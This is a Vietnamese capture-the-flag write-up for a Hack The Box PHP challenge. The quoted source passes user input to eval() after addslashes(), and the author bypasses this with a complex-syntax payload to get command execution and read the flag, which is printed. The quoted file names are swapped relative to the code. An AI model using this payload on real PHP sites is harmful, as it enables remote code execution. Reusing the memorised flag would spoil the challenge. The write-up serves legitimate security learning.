Truy cập trang chủ, chỉ có 1 nút nhấn với chức năng gọi về server sinh ra ngày tháng năm hiển thị ra trang web

Đường dẫn trang web sẽ có dạng : http://157.245.33.77:31103/?format=r

Download source code về, trong đó để ý đến 2 file là `/challenge/models/TimeMode.php` và `/challenge/controllers/TimeController.php`

file `/challenge/models/TimeMode.php`:

    <?php
    class TimeController
    {
        public function index($router)
        {
            $format = isset($_GET['format']) ? $_GET['format'] : 'r';
            $time = new TimeModel($format);
            return $router->view('index', ['time' => $time->getTime()]);
        }
    }

Trong file `/challenge/controllers/TimeController.php`:

    <?php
    class TimeModel
    {
        public function __construct($format)
        {
            $this->format = addslashes($format);

            [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
            $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
        }

        public function getTime()
        {
            eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
            return isset($time) ? $time : 'Something went terribly wrong';
        }
    }


Ta thấy khi gọi request đến http://157.245.33.77:31103/?format=r sẽ được route truyền biến $format vào class TimeModel.

Trong class TimeModel, biến $format sẽ được đi qua function `addslashes` trước khi được đưa vào function getTime(). Trong function getTime(), biến format sẽ được đưa vào function `eval`

    eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');

Đây là một function rất dễ gây ra lỗ hổng bảo mật. Tuy nhiên, do biến $format đã được xử lý qua function `addslashes` nên ta phải bypass nó.

Cùng tra google =)). Có một bài viết nói về việc bypass function addslashes và có cả POC exploit :v :

https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php

Theo bài viết, ta có thể bypass function trên bằng cách thay giá trị `r` thành `var_dump(${eval($_GET[1])}=123)&1=phpinfo();`

Kết quả trả về sẽ được trang chứa thông tin của phiên bản php, vậy là ta đã bypass thành công.

Thay `phpinfo()` thành `system("ls /")`, thấy file `flagtPI20`, thực hiện cat file và được flag.

Flag: HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}